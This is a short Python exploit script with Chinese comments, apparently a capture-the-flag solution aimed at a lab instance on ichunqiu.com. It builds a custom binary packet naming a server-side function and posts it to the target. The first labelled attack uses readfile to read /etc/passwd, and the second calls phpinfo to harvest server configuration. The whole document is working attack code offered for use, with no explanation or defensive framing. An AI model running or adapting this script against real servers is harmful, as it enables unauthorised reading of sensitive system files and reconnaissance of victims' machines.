import struct
import requests


def create_exploit_packet(func_name, data):
    # 计算各部分长度
    nFileNameLen = len(func_name)
    nFileDataLen = len(data)
    nHeadLen = 24  # 6个4字节整数 = 24字节
    nDataLen = nHeadLen + nFileNameLen + nFileDataLen
    nPackTotal = 1
    nPackNum = 1

    # 打包头部
    header = struct.pack('<6I', nDataLen, nHeadLen, nPackTotal, nPackNum, nFileNameLen, nFileDataLen)

    # 构建完整数据包
    packet = header + func_name.encode() + data.encode()
    return packet


# 目标URL
url = "https://eci-2zei9f8ok7u0yurtzgpd.cloudeci1.ichunqiu.com:80/"

# 攻击1：使用 readfile 读取敏感文件
print("=== 读取 /etc/passwd ===")
packet = create_exploit_packet("readfile", "/etc/passwd")
response = requests.post(url, data=packet, headers={'Content-Type': 'application/octet-stream'})
print(response.text)

# 攻击2：使用 phpinfo 获取服务器信息
print("\n=== 获取 phpinfo ===")
packet = create_exploit_packet("phpinfo", "")
response = requests.post(url, data=packet, headers={'Content-Type': 'application/octet-stream'})
print("phpinfo 内容已获取")